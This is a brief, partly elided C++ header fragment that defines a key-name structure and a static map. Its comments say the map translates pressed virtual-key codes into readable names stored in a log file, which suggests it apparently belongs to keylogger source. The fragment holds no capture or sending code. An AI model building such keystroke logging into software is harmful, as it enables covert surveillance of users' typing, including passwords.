#ifndef KEYCONSTANTS_H  //include guards
...
public:
    ...
    std::string VKName; // virtual key name (low level key names)
    std::string Name; // virtual key names will be mapped to user friendly names in map
};

class Keys { //This class is used to get pressed keys and translate to them to human readable form
public:
    static std::map<int, KeyPair> KEYS; // we will use this map to map VK code in human readable form
                                        // and store it in log file
};
